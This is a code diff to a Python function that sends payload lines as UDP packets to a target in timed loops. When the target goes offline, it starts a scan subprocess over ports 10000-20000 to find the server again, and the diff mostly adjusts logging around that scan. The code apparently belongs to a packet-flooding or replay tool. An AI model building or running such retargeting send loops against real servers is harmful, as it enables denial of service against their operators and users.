@@ -112,8 +112,9 @@ def sendPacket(target: str, port, payloadFile: str, loops, interval):
                     # print(index)
                     info = fileContent[contentCount-index-1]
                     if targetInfo in info:
-                        log("Found target info:")
-                        log(info)
+                        if not scanProcess:
+                            log("Found target info:")
+                            log(info)
                         targetAddr = info.split(" | ")[2]
                         port = info.split(" | ")[3]
                         break
@@ -135,11 +136,14 @@ def sendPacket(target: str, port, payloadFile: str, loops, interval):
                     scanProcess = False
         except:
             if isDisplayMotd:
+                if scanProcess:
+                    if scanProcess.poll() != None:
+                        scanProcess = False
                 if ":" in target and int(autoScan) == 8:
                     if not scanProcess:
                         log(f"Target server offline.")
                         log(f"Starting refresh ip list...")
-                        scanProcess = subprocess.Popen(["python", "scan.py", targetFileToScan, "10000-21000", "nn", "0", targetFileToScan])
+                        scanProcess = subprocess.Popen(["python", "scan.py", targetFileToScan, "10000-20000", "nn", "0", targetFileToScan])
                         targetFile = "updated.txt"
                 else:
                     log(f"Target server offline.")
@@ -152,10 +156,11 @@ def sendPacket(target: str, port, payloadFile: str, loops, interval):
             else:
                 for line in payloads:
                     socketSend.sendto(line, (targetAddr, int(port)))
-            log(f"Loop ", str(i),
-                  " done, used local port: ", str(localPort), "\n")
+            if not scanProcess:
+                # if scanProcess.poll() != None:
+                log(f"Loop {i} done, used local port: {localPort} \n")
         except:
-            log(f"Loop ", str(i), " error! Skip...", "\n")
+            log(f"Loop {i} error! Skip...\n")
             pass
         if i+1 < loops:
             time.sleep(interval)
